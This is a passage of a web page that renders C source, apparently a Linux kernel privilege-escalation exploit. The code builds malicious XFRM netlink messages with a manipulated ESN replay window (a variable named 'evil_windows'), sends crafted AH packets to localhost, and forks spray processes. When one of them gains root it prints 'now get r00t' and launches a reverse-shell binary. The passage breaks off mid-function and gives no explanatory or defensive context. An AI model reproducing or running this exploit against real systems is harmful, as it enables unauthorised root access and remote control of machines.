class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br><span class=\"line\">316</span><br><span class=\"line\">317</span><br><span class=\"line\">318</span><br><span class=\"line\">319</span><br><span class=\"line\">320</span><br><span class=\"line\">321</span><br><span class=\"line\">322</span><br><span class=\"line\">323</span><br><span class=\"line\">324</span><br><span class=\"line\">325</span><br><span class=\"line\">326</span><br><span class=\"line\">327</span><br><span class=\"line\">328</span><br><span class=\"line\">329</span><br><span class=\"line\">330</span><br><span class=\"line\">331</span><br><span class=\"line\">332</span><br><span class=\"line\">333</span><br><span class=\"line\">334</span><br><span class=\"line\">335</span><br><span class=\"line\">336</span><br><span class=\"line\">337</span><br><span class=\"line\">338</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td>\n    <td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;sys/types.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;linux/netlink.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;sys/socket.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;netinet/in.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;errno.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;arpa/inet.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;linux/in.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;linux/xfrm.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> MAX_PAYLOAD 4096</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">ip_auth_hdr</span> {</span></span><br><span class=\"line\">__u8nexthdr;</span><br><span class=\"line\">__u8hdrlen;</span><br><span class=\"line\">__be16reserved;<span class=\"comment\">/* big endian */</span></span><br><span class=\"line\">__be32spi;<span class=\"comment\">/* big endian */</span></span><br><span class=\"line\">__be32seq_no;<span class=\"comment\">/* big endian */</span></span><br><span class=\"line\">__u8auth_data[<span class=\"number\">8</span>];</span><br><span class=\"line\">};</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">fork_spary_n</span><span class=\"params\">(<span class=\"keyword\">int</span> n,<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> time)</span></span>{</span><br><span class=\"line\"><span class=\"keyword\">int</span> i;</span><br><span class=\"line\"><span class=\"keyword\">for</span>(i = <span class=\"number\">0</span>;i &lt; n;i++){</span><br><span class=\"line\"><span class=\"keyword\">int</span> pid ;</span><br><span class=\"line\">pid = fork();</span><br><span class=\"line\"><span class=\"keyword\">if</span>(pid ==<span class=\"number\">0</span>){</span><br><span class=\"line\">sleep(time);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(getuid() == <span class=\"number\">0</span>){</span><br><span class=\"line\"><span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">\"[+] now get r00t\\n\"</span> );</span><br><span class=\"line\">system(<span class=\"string\">\"id\"</span>);</span><br><span class=\"line\">system(<span class=\"string\">\"/home/p4nda/Desktop/reverse_shell\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"keyword\">else</span>{</span><br><span class=\"line\"><span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\">}</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">init_xfrm_socket</span><span class=\"params\">()</span></span>{</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">sockaddr_nl</span> <span class=\"title\">addr</span>;</span> </span><br><span class=\"line\"><span class=\"keyword\">int</span> result = <span class=\"number\">-1</span>,xfrm_socket;</span><br><span class=\"line\">xfrm_socket = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (xfrm_socket&lt;=<span class=\"number\">0</span>){</span><br><span class=\"line\">perror(<span class=\"string\">\"[-] bad NETLINK_XFRM socket \"</span>);</span><br><span class=\"line\"><span class=\"keyword\">return</span> result;</span><br><span class=\"line\">}</span><br><span class=\"line\"> addr.nl_family = PF_NETLINK; </span><br><span class=\"line\"> addr.nl_pad = <span class=\"number\">0</span>; </span><br><span class=\"line\"> addr.nl_pid = getpid(); </span><br><span class=\"line\"> addr.nl_groups = <span class=\"number\">0</span>;</span><br><span class=\"line\"> result = bind(xfrm_socket, (struct sockaddr *)&amp;addr, <span class=\"keyword\">sizeof</span>(addr));</span><br><span class=\"line\"> <span class=\"keyword\">if</span> (result&lt;<span class=\"number\">0</span>){</span><br><span class=\"line\">perror(<span class=\"string\">\"[-] bad bind \"</span>);</span><br><span class=\"line\">close(xfrm_socket);</span><br><span class=\"line\"><span class=\"keyword\">return</span> result;</span><br><span class=\"line\">} </span><br><span class=\"line\"><span class=\"keyword\">return</span> xfrm_socket;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">init_recvfd</span><span class=\"params\">()</span></span>{</span><br><span class=\"line\"><span class=\"keyword\">int</span> recvfd=<span class=\"number\">-1</span>;</span><br><span class=\"line\">recvfd= socket(AF_INET, SOCK_RAW, IPPROTO_AH );</span><br><span class=\"line\"><span class=\"keyword\">if</span> (recvfd&lt;=<span class=\"number\">0</span>){</span><br><span class=\"line\">perror(<span class=\"string\">\"[-] bad IPPROTO_AH socket \"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"keyword\">return</span> recvfd;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">init_sendfd</span><span class=\"params\">()</span></span>{</span><br><span class=\"line\"><span class=\"keyword\">int</span> sendfd=<span class=\"number\">-1</span>,err;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">sockaddr_in</span> <span class=\"title\">addr</span>;</span></span><br><span class=\"line\">sendfd= socket(AF_INET, SOCK_RAW, IPPROTO_AH );</span><br><span class=\"line\"><span class=\"keyword\">if</span> (sendfd&lt;=<span class=\"number\">0</span>){</span><br><span class=\"line\">perror(<span class=\"string\">\"[-] bad IPPROTO_AH socket \"</span>);</span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"built_in\">memset</span>(&amp;addr,<span class=\"number\">0</span>,<span class=\"keyword\">sizeof</span>(addr));</span><br><span class=\"line\">addr.sin_family = AF_INET;</span><br><span class=\"line\">addr.sin_port = htons(<span class=\"number\">0x4869</span>);</span><br><span class=\"line\">addr.sin_addr.s_addr = inet_addr(<span class=\"string\">\"127.0.0.1\"</span>);</span><br><span class=\"line\">err = bind(sendfd, (struct sockaddr*)&amp;addr,<span class=\"keyword\">sizeof</span>(addr));</span><br><span class=\"line\"><span class=\"keyword\">if</span> (err&lt;<span class=\"number\">0</span>){</span><br><span class=\"line\">perror(<span class=\"string\">\"[-] bad bind\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"keyword\">return</span> sendfd;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">dump_data</span><span class=\"params\">(<span class=\"keyword\">char</span> *buf,<span class=\"keyword\">size_t</span> len)</span></span>{</span><br><span class=\"line\"><span class=\"built_in\">puts</span>(<span class=\"string\">\"=========================\"</span>);</span><br><span class=\"line\"> <span class=\"keyword\">int</span> i ;</span><br><span class=\"line\"> <span class=\"keyword\">for</span>(i = <span class=\"number\">0</span>;i&lt;((len/<span class=\"number\">8</span>)*<span class=\"number\">8</span>);i+=<span class=\"number\">8</span>){</span><br><span class=\"line\"> <span class=\"built_in\">printf</span>(<span class=\"string\">\"0x%lx\"</span>,*(<span class=\"keyword\">size_t</span> *)(buf+i) );</span><br><span class=\"line\"> <span class=\"keyword\">if</span> (i%<span class=\"number\">16</span>)</span><br><span class=\"line\"> <span class=\"built_in\">printf</span>(<span class=\"string\">\" \"</span>);</span><br><span class=\"line\"> <span class=\"keyword\">else</span></span><br><span class=\"line\"> <span class=\"built_in\">printf</span>(<span class=\"string\">\"\\n\"</span>);</span><br><span class=\"line\"> }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">xfrm_add_sa</span><span class=\"params\">(<span class=\"keyword\">int</span> sock,<span class=\"keyword\">int</span> spi,<span class=\"keyword\">int</span> bmp_len)</span></span>{</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">sockaddr_nl</span> <span class=\"title\">nladdr</span>;</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">msghdr</span> <span class=\"title\">msg</span>;</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">nlmsghdr</span> *<span class=\"title\">nlhdr</span>;</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">iovec</span> <span class=\"title\">iov</span>;</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> len = <span class=\"number\">4096</span>,err;</span><br><span class=\"line\"><span class=\"keyword\">char</span> *data;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">memset</span>(&amp;nladdr, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(nladdr));</span><br><span class=\"line\">nladdr.nl_family = AF_NETLINK;</span><br><span class=\"line\">nladdr.nl_pid = <span class=\"number\">0</span>;</span><br><span class=\"line\">nladdr.nl_groups = <span class=\"number\">0</span>;</span><br><span class=\"line\">nlhdr = (struct nlmsghdr *)<span class=\"built_in\">malloc</span>(NLMSG_SPACE(len));</span><br><span class=\"line\"><span class=\"built_in\">memset</span>(nlhdr,<span class=\"number\">0</span>,NLMSG_SPACE(len));</span><br><span class=\"line\"></span><br><span class=\"line\">nlhdr-&gt;nlmsg_len = NLMSG_LENGTH(len);</span><br><span class=\"line\">nlhdr-&gt;nlmsg_flags = NLM_F_REQUEST;</span><br><span class=\"line\">nlhdr-&gt;nlmsg_pid = getpid();</span><br><span class=\"line\">nlhdr-&gt;nlmsg_type = XFRM_MSG_NEWSA;</span><br><span class=\"line\"></span><br><span class=\"line\">data = NLMSG_DATA(nlhdr); </span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">xfrm_usersa_info</span> <span class=\"title\">xui</span>;</span></span><br><span class=\"line\"><span class=\"built_in\">memset</span>(&amp;xui,<span class=\"number\">0</span>,<span class=\"keyword\">sizeof</span>(xui));</span><br><span class=\"line\">xui.family = AF_INET;</span><br><span class=\"line\">xui.id.proto = IPPROTO_AH;</span><br><span class=\"line\">xui.id.spi = spi;</span><br><span class=\"line\">xui.id.daddr.a4 = inet_addr(<span class=\"string\">\"127.0.0.1\"</span>);</span><br><span class=\"line\">xui.lft.hard_byte_limit = <span class=\"number\">0x10000000</span>;</span><br><span class=\"line\">xui.lft.hard_packet_limit = <span class=\"number\">0x10000000</span>;</span><br><span class=\"line\">xui.lft.soft_byte_limit = <span class=\"number\">0x1000</span>;</span><br><span class=\"line\">xui.lft.soft_packet_limit = <span class=\"number\">0x1000</span>;</span><br><span class=\"line\">xui.mode = XFRM_MODE_TRANSPORT;</span><br><span class=\"line\">xui.flags = XFRM_STATE_ESN;</span><br><span class=\"line\"><span class=\"built_in\">memcpy</span>(data,&amp;xui,<span class=\"keyword\">sizeof</span>(xui));</span><br><span class=\"line\"></span><br><span class=\"line\">data += <span class=\"keyword\">sizeof</span>(xui);</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">nlattr</span> <span class=\"title\">nla</span>;</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">xfrm_algo</span> <span class=\"title\">xa</span>;</span></span><br><span class=\"line\"><span class=\"built_in\">memset</span>(&amp;nla, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(nla));</span><br><span class=\"line\"><span class=\"built_in\">memset</span>(&amp;xa, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(xa));</span><br><span class=\"line\">nla.nla_len = <span class=\"keyword\">sizeof</span>(xa) + <span class=\"keyword\">sizeof</span>(nla);</span><br><span class=\"line\">nla.nla_type = XFRMA_ALG_AUTH;</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(xa.alg_name, <span class=\"string\">\"digest_null\"</span>);</span><br><span class=\"line\">xa.alg_key_len = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"built_in\">memcpy</span>(data, &amp;nla, <span class=\"keyword\">sizeof</span>(nla));</span><br><span class=\"line\">data += <span class=\"keyword\">sizeof</span>(nla);</span><br><span class=\"line\"><span class=\"built_in\">memcpy</span>(data, &amp;xa, <span class=\"keyword\">sizeof</span>(xa));</span><br><span class=\"line\">data += <span class=\"keyword\">sizeof</span>(xa);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">xfrm_replay_state_esn</span> <span class=\"title\">rs</span>;</span></span><br><span class=\"line\"><span class=\"built_in\">memset</span>(&amp;nla, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(nla));</span><br><span class=\"line\">nla.nla_len = <span class=\"keyword\">sizeof</span>(nla)+<span class=\"keyword\">sizeof</span>(rs) +bmp_len*<span class=\"number\">8</span>*<span class=\"number\">4</span>;</span><br><span class=\"line\">nla.nla_type = XFRMA_REPLAY_ESN_VAL;</span><br><span class=\"line\">rs.replay_window = bmp_len;</span><br><span class=\"line\">rs.bmp_len = bmp_len;</span><br><span class=\"line\"><span class=\"built_in\">memcpy</span>(data,&amp;nla,<span class=\"keyword\">sizeof</span>(nla));</span><br><span class=\"line\">data += <span class=\"keyword\">sizeof</span>(nla);</span><br><span class=\"line\"><span class=\"built_in\">memcpy</span>(data, &amp;rs, <span class=\"keyword\">sizeof</span>(rs));</span><br><span class=\"line\">data += <span class=\"keyword\">sizeof</span>(rs);</span><br><span class=\"line\"><span class=\"built_in\">memset</span>(data,<span class=\"string\">'1'</span>,bmp_len*<span class=\"number\">4</span>*<span class=\"number\">8</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">iov.iov_base = (<span class=\"keyword\">void</span> *)nlhdr;</span><br><span class=\"line\">iov.iov_len = nlhdr-&gt;nlmsg_len;</span><br><span class=\"line\"><span class=\"built_in\">memset</span>(&amp;msg, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(msg));</span><br><span class=\"line\">msg.msg_name = (<span class=\"keyword\">void</span> *)&amp;(nladdr);</span><br><span class=\"line\">msg.msg_namelen = <span class=\"keyword\">sizeof</span>(nladdr);</span><br><span class=\"line\">msg.msg_iov = &amp;iov;</span><br><span class=\"line\">msg.msg_iovlen = <span class=\"number\">1</span>;</span><br><span class=\"line\"> <span class=\"comment\">//dump_data(&amp;msg,iov.iov_len);</span></span><br><span class=\"line\">err = sendmsg (sock, &amp;msg, <span class=\"number\">0</span>); </span><br><span class=\"line\"><span class=\"keyword\">if</span> (err&lt;<span class=\"number\">0</span>){</span><br><span class=\"line\">perror(<span class=\"string\">\"[-] bad sendmsg\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"keyword\">return</span> err;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">xfrm_new_ae</span><span class=\"params\">(<span class=\"keyword\">int</span> sock,<span class=\"keyword\">int</span> spi,<span class=\"keyword\">int</span> bmp_len,<span class=\"keyword\">int</span> evil_windows,<span class=\"keyword\">int</span> seq,<span class=\"keyword\">int</span> seq_hi)</span></span>{</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">sockaddr_nl</span> <span class=\"title\">nladdr</span>;</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">msghdr</span> <span class=\"title\">msg</span>;</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">nlmsghdr</span> *<span class=\"title\">nlhdr</span>;</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">iovec</span> <span class=\"title\">iov</span>;</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> len = <span class=\"number\">4096</span>,err;</span><br><span class=\"line\"><span class=\"keyword\">char</span> *data;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">memset</span>(&amp;nladdr, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(nladdr));</span><br><span class=\"line\">nladdr.nl_family = AF_NETLINK;</span><br><span class=\"line\">nladdr.nl_pid = <span class=\"number\">0</span>;</span><br><span class=\"line\">nladdr.nl_groups = <span class=\"number\">0</span>;</span><br><span class=\"line\">nlhdr = (struct nlmsghdr *)<span class=\"built_in\">malloc</span>(NLMSG_SPACE(len));</span><br><span class=\"line\"><span class=\"built_in\">memset</span>(nlhdr,<span class=\"number\">0</span>,NLMSG_SPACE(len));</span><br><span class=\"line\"></span><br><span class=\"line\">nlhdr-&gt;nlmsg_len = NLMSG_LENGTH(len);</span><br><span class=\"line\">nlhdr-&gt;nlmsg_flags = NLM_F_REQUEST|NLM_F_REPLACE;</span><br><span class=\"line\">nlhdr-&gt;nlmsg_pid = getpid();</span><br><span class=\"line\">nlhdr-&gt;nlmsg_type = XFRM_MSG_NEWAE;</span><br><span class=\"line\"></span><br><span class=\"line\">data = NLMSG_DATA(nlhdr); </span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">xfrm_aevent_id</span> <span class=\"title\">xai</span>;</span></span><br><span class=\"line\"><span class=\"built_in\">memset</span>(&amp;xai,<span class=\"number\">0</span>,<span class=\"keyword\">sizeof</span>(xai));</span><br><span class=\"line\">xai.sa_id.proto = IPPROTO_AH;</span><br><span class=\"line\">xai.sa_id.family = AF_INET;</span><br><span class=\"line\">xai.sa_id.spi = spi;</span><br><span class=\"line\">xai.sa_id.daddr.a4 = inet_addr(<span class=\"string\">\"127.0.0.1\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">memcpy</span>(data,&amp;xai,<span class=\"keyword\">sizeof</span>(xai));</span><br><span class=\"line\">data += <span class=\"keyword\">sizeof</span>(xai);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">nlattr</span> <span class=\"title\">nla</span>;</span></span><br><span class=\"line\"><span class=\"built_in\">memset</span>(&amp;nla, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(nla));</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">xfrm_replay_state_esn</span> <span class=\"title\">rs</span>;</span></span><br><span class=\"line\"><span class=\"built_in\">memset</span>(&amp;nla, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(nla));</span><br><span class=\"line\">nla.nla_len = <span class=\"keyword\">sizeof</span>(nla)+<span class=\"keyword\">sizeof</span>(rs) +bmp_len*<span class=\"number\">8</span>*<span class=\"number\">4</span>;</span><br><span class=\"line\">nla.nla_type = XFRMA_REPLAY_ESN_VAL;</span><br><span class=\"line\">rs.replay_window = evil_windows;</span><br><span class=\"line\">rs.bmp_len = bmp_len;</span><br><span class=\"line\">rs.seq_hi = seq_hi;</span><br><span class=\"line\">rs.seq = seq;</span><br><span class=\"line\"><span class=\"built_in\">memcpy</span>(data,&amp;nla,<span class=\"keyword\">sizeof</span>(nla));</span><br><span class=\"line\">data += <span class=\"keyword\">sizeof</span>(nla);</span><br><span class=\"line\"><span class=\"built_in\">memcpy</span>(data, &amp;rs, <span class=\"keyword\">sizeof</span>(rs));</span><br><span class=\"line\">data += <span class=\"keyword\">sizeof</span>(rs);</span><br><span class=\"line\"><span class=\"built_in\">memset</span>(data,<span class=\"string\">'1'</span>,bmp_len*<span class=\"number\">4</span>*<span class=\"number\">8</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">iov.iov_base = (<span class=\"keyword\">void</span> *)nlhdr;</span><br><span class=\"line\">iov.iov_len = nlhdr-&gt;nlmsg_len;</span><br><span class=\"line\"><span class=\"built_in\">memset</span>(&amp;msg, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(msg));</span><br><span class=\"line\">msg.msg_name = (<span class=\"keyword\">void</span> *)&amp;(nladdr);</span><br><span class=\"line\">msg.msg_namelen = <span class=\"keyword\">sizeof</span>(nladdr);</span><br><span class=\"line\">msg.msg_iov = &amp;iov;</span><br><span class=\"line\">msg.msg_iovlen = <span class=\"number\">1</span>;</span><br><span class=\"line\">err = sendmsg (sock, &amp;msg, <span class=\"number\">0</span>); </span><br><span class=\"line\"><span class=\"keyword\">if</span> (err&lt;<span class=\"number\">0</span>){</span><br><span class=\"line\">perror(<span class=\"string\">\"[-] bad sendmsg\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"keyword\">return</span> err;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">sendah</span><span class=\"params\">(<span class=\"keyword\">int</span> sock,<span class=\"keyword\">int</span> spi,<span class=\"keyword\">int</span> seq )</span></span>{</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">sockaddr_in</span> <span class=\"title\">sai</span>;</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">iovec</span> <span class=\"title\">iov</span>;</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">msghdr</span> <span class=\"title\">msg</span>;</span></span><br><span class=\"line\"><span class=\"keyword\">char</span> *data;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">ip_auth_hdr</span> <span class=\"title\">ah</span>;</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> err;</span><br><span class=\"line\"><span class=\"built_in\">memset</span>(&amp;msg, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(msg));</span><br><span class=\"line\"><span class=\"built_in\">memset</span>(&amp;sai, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(sai));</span><br><span class=\"line\">sai.sin_addr.s_addr = inet_addr(<span class=\"string\">\"127.0.0.1\"</span>);</span><br><span class=\"line\">sai.sin_port = htons(<span class=\"number\">0x4869</span>);</span><br><span class=\"line\">sai.sin_family = AF_INET;</span><br><span class=\"line\">data = <span class=\"built_in\">malloc</span>(<span class=\"number\">4096</span>);</span><br><span class=\"line\"><span class=\"built_in\">memset</span>(data,<span class=\"string\">'1'</span>,<span class=\"number\">4096</span>);</span><br><span class=\"line\">ah.spi = spi;</span><br><span class=\"line\">ah.nexthdr = <span class=\"number\">1</span>;</span><br><span class=\"line\">ah.seq_no = seq;</span><br><span class=\"line\">ah.hdrlen = (<span class=\"number\">0x10</span> &gt;&gt; <span class=\"number\">2</span>) - <span class=\"number\">2</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">memcpy</span>(data,&amp;ah,<span class=\"keyword\">sizeof</span>(ah));</span><br><span class=\"line\"></span><br><span class=\"line\">iov.iov_base = (<span class=\"keyword\">void</span> *)data;</span><br><span class=\"line\">iov.iov_len = <span class=\"number\">4096</span>;</span><br><span class=\"line\"><span class=\"built_in\">memset</span>(&amp;msg, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(msg));</span><br><span class=\"line\">msg.msg_name = (<span class=\"keyword\">void</span> *)&amp;(sai);</span><br><span class=\"line\">msg.msg_namelen = <span class=\"keyword\">sizeof</span>(sai);</span><br><span class=\"line\">msg.msg_iov = &amp;iov;</span><br><span class=\"line\">msg.msg_iovlen = <span class=\"number\">1</span>;</span><br><span class=\"line\"> <span class=\"comment\">//dump_data(&amp;msg,iov.iov_len);</span></span><br><span class=\"line\"><span class=\"comment\">//dump_data(nlhdr,iov.iov_len);</span></span><br><span class=\"line\">err = sendmsg (sock, &amp;msg, <span class=\"number\">0</span>); </span><br><span class=\"line\"><span class=\"keyword\">if</span> (err&lt;<span class=\"number\">0</span>){</span><br><span class=\"line\">perror(<span class=\"string\">\"[-] bad sendmsg\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"keyword\">return</span> err;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span 